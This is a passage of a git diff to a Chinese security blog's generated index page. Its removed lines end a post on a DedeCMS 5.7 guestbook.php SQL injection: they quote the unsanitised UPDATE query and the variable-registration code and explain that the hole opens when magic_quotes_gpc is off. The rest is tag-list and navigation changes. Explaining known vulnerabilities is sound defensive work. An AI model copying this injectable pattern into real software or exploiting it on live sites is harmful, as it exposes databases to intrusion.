-    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre>
-<p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p>
-<pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
-    {
-        foreach($$_request as $_k =&gt; $_v) 
-        {
-            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;
-            else ${$_k} = _RunMagicQuotes($_v);
-        }
-    }</code></pre>
-<p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p>
-<pre><code class="php">function _RunMagicQuotes(&amp;$svar)
-{
-    if(!get_magic_quotes_gpc())
-    {
-        ...
-    }
-    return $svar;
-}</code></pre>
-<p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://explorersss.github.io/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ck6gmu6la0000ncv0go1n70w4" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next -&gt;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next -&gt;</a>
   </nav>
 
 </section>
@@ -1749,7 +2248,7 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
     </div>
   </div>
 
@@ -1759,7 +2258,7 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 17.5px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 20px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 12.5px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">域渗透</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">小工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 12.5px;">杂</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12.5px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/ctf/" style="font-size: 17.5px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 20px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 15px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">域渗透</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">小工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 12.5px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12.5px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -1781,6 +2280,10 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
       <ul>
         
           <li>
+            <a href="/2020/02/26/i%E6%98%A5%E7%A7%8B2020/">i春秋2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/02/20/%E6%9F%90misc/">某misc</a>
           </li>
         
@@ -1794,10 +2297,6 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
         
           <li>
             <a href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
-          </li>
-        
-          <li>
-            <a href="/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">vulnstackATT&amp;CK红队评估靶场1渗透记录</a>
           </li>
         
       </ul>
